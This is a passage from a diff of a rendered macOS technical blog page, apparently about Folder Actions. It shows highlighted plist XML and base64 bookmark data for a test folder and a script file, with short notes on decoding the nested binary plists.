-				<span style="color:#309;font-weight:bold">&lt;string&gt;</span>InternalFolderAction<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
-				<span style="color:#309;font-weight:bold">&lt;string&gt;</span>NSObject<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;/array&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$classname<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;string&gt;</span>InternalFolderAction<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-	<span style="color:#309;font-weight:bold">&lt;/array&gt;</span>
-	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$top<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-	<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;key&gt;</span>root<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-			<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>1<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
-		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-	<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$version<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
-	<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>100000<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
-<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
-<span style="color:#309;font-weight:bold">&lt;/plist&gt;</span>
-</code></pre></div><p>More embedded data! :( If we decode the new base64 strings, we will again get a binary plist. Unfortunately <code>plutil</code> can&rsquo;t convert it, and throws an error but if we take a look it will contain further info about the folders we set and the script.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#099">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#099">&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#309;font-weight:bold">&lt;plist</span> <span style="color:#309">version=</span><span style="color:#c30">&#34;1.0&#34;</span><span style="color:#309;font-weight:bold">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>folderActions<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;data&gt;</span>
+</span></span><span style="display:flex;"><span>	YnBsaXN0MDDUAQIDBAUGBwpYJHZlcnNpb25ZJGFyY2hpdmVyVCR0b3BYJG9iamVjdHMS
+</span></span><span style="display:flex;"><span>	AAGGoF8QD05TS2V5ZWRBcmNoaXZlctEICVRyb290gAGuCwwSHh8gISQrLzQ1NjpVJG51
+</span></span><span style="display:flex;"><span>	bGzSDQ4PEVpOUy5vYmplY3RzViRjbGFzc6EQgAKAB9YTFBUWFw4YGRobHB1YYm9va21h
+</span></span><span style="display:flex;"><span>	cmtXZW5hYmxlZF1wcmlvckNvbnRlbnRzVG5hbWVXc2NyaXB0c4ADgAWABoAEgAiADU8R
+</span></span><span style="display:flex;"><span>	A2Bib29rYAMAAAAABBAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQ
+</span></span><span style="display:flex;"><span>	AgAABAAAAAMDAAAAAgAABQAAAAEBAABVc2VycwAAAAUAAAABAQAAY3NhYnkAAAAEAAAA
+</span></span><span style="display:flex;"><span>	AQEAAHRlc3QMAAAAAQYAABAAAAAgAAAAMAAAAAgAAAAEAwAAQ10AAAMAAAAIAAAABAMA
+</span></span><span style="display:flex;"><span>	AE2ZAAADAAAACAAAAAQDAACpGgYAAwAAAAwAAAABBgAAUAAAAGAAAABwAAAACAAAAAAE
+</span></span><span style="display:flex;"><span>	AABBw6vM+VIwNxgAAAABAgAAAgAAAAAAAAAPAAAAAAAAAAAAAAAAAAAACAAAAAQDAAAB
+</span></span><span style="display:flex;"><span>	AAAAAAAAAAQAAAADAwAA9QEAAAgAAAABCQAAZmlsZTovLy8MAAAAAQEAAE1hY2ludG9z
+</span></span><span style="display:flex;"><span>	aCBIRAgAAAAEAwAAAJAvUAkAAAAIAAAAAAQAAEHDjpDvAAAAJAAAAAEBAAAwQTgxRjNC
+</span></span><span style="display:flex;"><span>	MS01MUQ5LTMzMzUtQjNFMy0xNjlDMzY0MDM2MEQYAAAAAQIAAIEAAAABAAAA7xMAAAEA
+</span></span><span style="display:flex;"><span>	AAAAAAAAAAAAAAEAAAABAQAALwAAAAAAAAABBQAAwwAAAAECAAA0MmMxMGVlZjZiNTNi
+</span></span><span style="display:flex;"><span>	ZTcwMWI2NjZhMTM4M2E3YmQwMWQ1YjE4NzA0ODUxMzRhMDViMDFhZTU2YzYyOTcwZTkw
+</span></span><span style="display:flex;"><span>	OzAwOzAwMDAwMDAwOzAwMDAwMDAwOzAwMDAwMDAwOzAwMDAwMDAwMDAwMDAwMjA7Y29t
+</span></span><span style="display:flex;"><span>	LmFwcGxlLmFwcC1zYW5kYm94LnJlYWQtd3JpdGU7MDE7MDEwMDAwMDY7MDAwMDAwMDMw
+</span></span><span style="display:flex;"><span>	MDA2MWFhOTswMTsvdXNlcnMvY3NhYnkvdGVzdAAA2AAAAP7///8BAAAAAAAAABEAAAAE
+</span></span><span style="display:flex;"><span>	EAAAPAAAAAAAAAAFEAAAgAAAAAAAAAAQEAAApAAAAAAAAABAEAAAlAAAAAAAAAACIAAA
+</span></span><span style="display:flex;"><span>	cAEAAAAAAAAFIAAA4AAAAAAAAAAQIAAA8AAAAAAAAAARIAAAJAEAAAAAAAASIAAABAEA
+</span></span><span style="display:flex;"><span>	AAAAAAATIAAAFAEAAAAAAAAgIAAAUAEAAAAAAAAwIAAAfAEAAAAAAAABwAAAxAAAAAAA
+</span></span><span style="display:flex;"><span>	AAARwAAAIAAAAAAAAAASwAAA1AAAAAAAAAAQ0AAABAAAAAAAAACA8AAAhAEAAAAAAABU
+</span></span><span style="display:flex;"><span>	dGVzdAnSDQ4iEaCAB9IlJicoWiRjbGFzc25hbWVYJGNsYXNzZXNeTlNNdXRhYmxlQXJy
+</span></span><span style="display:flex;"><span>	YXmjJykqV05TQXJyYXlYTlNPYmplY3TSDQ4sEaEtgAmAB9QTFBYOMBkyM4AKgAWAC4AM
+</span></span><span style="display:flex;"><span>	TxEELGJvb2ssBAAAAAAEEDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span><span style="display:flex;"><span>	ABwDAAAEAAAAAwMAAAACAAAFAAAAAQEAAFVzZXJzAAAABQAAAAEBAABjc2FieQAAAAcA
+</span></span><span style="display:flex;"><span>	AAABAQAATGlicmFyeQAHAAAAAQEAAFNjcmlwdHMAFQAAAAEBAABGb2xkZXIgQWN0aW9u
+</span></span><span style="display:flex;"><span>	IFNjcmlwdHMAAAARAAAAAQEAAGZvbGRlcmFjdGlvbi5zY3B0AAAAGAAAAAEGAAAQAAAA
+</span></span><span style="display:flex;"><span>	IAAAADAAAABAAAAAUAAAAHAAAAAIAAAABAMAAENdAAADAAAACAAAAAQDAABNmQAAAwAA
+</span></span><span style="display:flex;"><span>	AAgAAAAEAwAAVZkAAAMAAAAIAAAABAMAAJ8dBgADAAAACAAAAAQDAACgHQYAAwAAAAgA
+</span></span><span style="display:flex;"><span>	AAAEAwAArR0GAAMAAAAYAAAAAQYAAKwAAAC8AAAAzAAAANwAAADsAAAA/AAAAAgAAAAA
+</span></span><span style="display:flex;"><span>	BAAAQcOrziIIAWgYAAAAAQIAAAEAAAAAAAAADwAAAAAAAAAAAAAAAAAAAAgAAAAEAwAA
+</span></span><span style="display:flex;"><span>	BAAAAAAAAAAEAAAAAwMAAPUBAAAIAAAAAQkAAGZpbGU6Ly8vDAAAAAEBAABNYWNpbnRv
+</span></span><span style="display:flex;"><span>	c2ggSEQIAAAABAMAAACQL1AJAAAACAAAAAAEAABBw46Q7wAAACQAAAABAQAAMEE4MUYz
+</span></span><span style="display:flex;"><span>	QjEtNTFEOS0zMzM1LUIzRTMtMTY5QzM2NDAzNjBEGAAAAAECAACBAAAAAQAAAO8TAAAB
+</span></span><span style="display:flex;"><span>	AAAAAAAAAAAAAAABAAAAAQEAAC8AAAAAAAAAAQUAAPYAAAABAgAAMDk0YmQ1NjJiMGUw
+</span></span><span style="display:flex;"><span>	MmFkNmQ5ODg3YTY3YWRkYTA0YzRlNzg0ZWViNGZiYWE1MjhkYzA0M2Y4YTU0OGU3NTA0
+</span></span><span style="display:flex;"><span>	MjswMDswMDAwMDAwMDswMDAwMDAwMDswMDAwMDAwMDswMDAwMDAwMDAwMDAwMDIwO2Nv
+</span></span><span style="display:flex;"><span>	bS5hcHBsZS5hcHAtc2FuZGJveC5yZWFkLXdyaXRlOzAxOzAxMDAwMDA2OzAwMDAwMDAz
+</span></span><span style="display:flex;"><span>	MDAwNjFkYWQ7MDE7L3VzZXJzL2NzYWJ5L2xpYnJhcnkvc2NyaXB0cy9mb2xkZXIgYWN0
+</span></span><span style="display:flex;"><span>	aW9uIHNjcmlwdHMvZm9sZGVyYWN0aW9uLnNjcHQAAADYAAAA/v///wEAAAAAAAAAEQAA
+</span></span><span style="display:flex;"><span>	AAQQAACMAAAAAAAAAAUQAAAMAQAAAAAAABAQAAA8AQAAAAAAAEAQAAAsAQAAAAAAAAIg
+</span></span><span style="display:flex;"><span>	AAAIAgAAAAAAAAUgAAB4AQAAAAAAABAgAACIAQAAAAAAABEgAAC8AQAAAAAAABIgAACc
+</span></span><span style="display:flex;"><span>	AQAAAAAAABMgAACsAQAAAAAAACAgAADoAQAAAAAAADAgAAAUAgAAAAAAAAHAAABcAQAA
+</span></span><span style="display:flex;"><span>	AAAAABHAAAAgAAAAAAAAABLAAABsAQAAAAAAABDQAAAEAAAAAAAAAIDwAAAcAgAAAAAA
+</span></span><span style="display:flex;"><span>	AF8QEWZvbGRlcmFjdGlvbi5zY3B00iUmNzheSW50ZXJuYWxTY3JpcHSiOSpeSW50ZXJu
+</span></span><span style="display:flex;"><span>	YWxTY3JpcHTSJSY7PF8QFEludGVybmFsRm9sZGVyQWN0aW9uoj0qXxAUSW50ZXJuYWxG
+</span></span><span style="display:flex;"><span>	b2xkZXJBY3Rpb24ACAARABoAJAApADIANwBJAEwAUQBTAGIAaABtAHgAfwCBAIMAhQCS
+</span></span><span style="display:flex;"><span>	AJsAowCxALYAvgDAAMIAxADGAMgAygQuBDMENAQ5BDoEPARBBEwEVQRkBGgEcAR5BH4E
+</span></span><span style="display:flex;"><span>	gASCBIQEjQSPBJEEkwSVCMUI2QjeCO0I8Aj/CQQJGwkeAAAAAAAAAgEAAAAAAAAAPgAA
+</span></span><span style="display:flex;"><span>	AAAAAAAAAAAAAAAACTU=
+</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;/data&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>folderActionsEnabled<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;true/&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#309;font-weight:bold">&lt;/plist&gt;</span>
+</span></span></code></pre></div><p>This is not too informative. We can decode the base64 data, and get a binary plist. If we convert it to XML we get the following.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#099">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#099">&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#309;font-weight:bold">&lt;plist</span> <span style="color:#309">version=</span><span style="color:#c30">&#34;1.0&#34;</span><span style="color:#309;font-weight:bold">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$archiver<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;string&gt;</span>NSKeyedArchiver<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$objects<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#309;font-weight:bold">&lt;array&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;string&gt;</span>$null<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$class<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>7<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>NS.objects<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;array&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>					<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>					<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>2<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;/array&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$class<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>13<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>bookmark<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>3<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>enabled<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>5<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>name<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>4<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>priorContents<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>6<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>scripts<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>8<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;data&gt;</span>
+</span></span><span style="display:flex;"><span>		Ym9va2ADAAAAAAQQMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</span></span><span style="display:flex;"><span>		AAAAUAIAAAQAAAADAwAAAAIAAAUAAAABAQAAVXNlcnMAAAAFAAAAAQEAAGNz
+</span></span><span style="display:flex;"><span>		YWJ5AAAABAAAAAEBAAB0ZXN0DAAAAAEGAAAQAAAAIAAAADAAAAAIAAAABAMA
+</span></span><span style="display:flex;"><span>		AENdAAADAAAACAAAAAQDAABNmQAAAwAAAAgAAAAEAwAAqRoGAAMAAAAMAAAA
+</span></span><span style="display:flex;"><span>		AQYAAFAAAABgAAAAcAAAAAgAAAAABAAAQcOrzPlSMDcYAAAAAQIAAAIAAAAA
+</span></span><span style="display:flex;"><span>		AAAADwAAAAAAAAAAAAAAAAAAAAgAAAAEAwAAAQAAAAAAAAAEAAAAAwMAAPUB
+</span></span><span style="display:flex;"><span>		AAAIAAAAAQkAAGZpbGU6Ly8vDAAAAAEBAABNYWNpbnRvc2ggSEQIAAAABAMA
+</span></span><span style="display:flex;"><span>		AACQL1AJAAAACAAAAAAEAABBw46Q7wAAACQAAAABAQAAMEE4MUYzQjEtNTFE
+</span></span><span style="display:flex;"><span>		OS0zMzM1LUIzRTMtMTY5QzM2NDAzNjBEGAAAAAECAACBAAAAAQAAAO8TAAAB
+</span></span><span style="display:flex;"><span>		AAAAAAAAAAAAAAABAAAAAQEAAC8AAAAAAAAAAQUAAMMAAAABAgAANDJjMTBl
+</span></span><span style="display:flex;"><span>		ZWY2YjUzYmU3MDFiNjY2YTEzODNhN2JkMDFkNWIxODcwNDg1MTM0YTA1YjAx
+</span></span><span style="display:flex;"><span>		YWU1NmM2Mjk3MGU5MDswMDswMDAwMDAwMDswMDAwMDAwMDswMDAwMDAwMDsw
+</span></span><span style="display:flex;"><span>		MDAwMDAwMDAwMDAwMDIwO2NvbS5hcHBsZS5hcHAtc2FuZGJveC5yZWFkLXdy
+</span></span><span style="display:flex;"><span>		aXRlOzAxOzAxMDAwMDA2OzAwMDAwMDAzMDAwNjFhYTk7MDE7L3VzZXJzL2Nz
+</span></span><span style="display:flex;"><span>		YWJ5L3Rlc3QAANgAAAD+////AQAAAAAAAAARAAAABBAAADwAAAAAAAAABRAA
+</span></span><span style="display:flex;"><span>		AIAAAAAAAAAAEBAAAKQAAAAAAAAAQBAAAJQAAAAAAAAAAiAAAHABAAAAAAAA
+</span></span><span style="display:flex;"><span>		BSAAAOAAAAAAAAAAECAAAPAAAAAAAAAAESAAACQBAAAAAAAAEiAAAAQBAAAA
+</span></span><span style="display:flex;"><span>		AAAAEyAAABQBAAAAAAAAICAAAFABAAAAAAAAMCAAAHwBAAAAAAAAAcAAAMQA
+</span></span><span style="display:flex;"><span>		AAAAAAAAEcAAACAAAAAAAAAAEsAAANQAAAAAAAAAENAAAAQAAAAAAAAAgPAA
+</span></span><span style="display:flex;"><span>		AIQBAAAAAAAA
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;/data&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;string&gt;</span>test<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;true/&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$class<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>7<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>NS.objects<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;array/&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$classes<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;array&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;string&gt;</span>NSMutableArray<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;string&gt;</span>NSArray<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;string&gt;</span>NSObject<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;/array&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$classname<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;string&gt;</span>NSMutableArray<span style="color:#309;font-weight:bold">&lt;/string&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$class<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>7<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>NS.objects<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;array&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>					<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>					<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>9<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;/array&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>$class<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>12<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>bookmark<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;integer&gt;</span>10<span style="color:#309;font-weight:bold">&lt;/integer&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;/dict&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;key&gt;</span>enabled<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#309;font-weight:bold">&lt;dict&gt;</span>
+</span></span><span style="display:flex;"><span>				<span style="color:#309;font-weight:bold">&lt;key&gt;</span>CF$UID<span style="color:#309;font-weight:bold">&lt;/key&gt;</span>
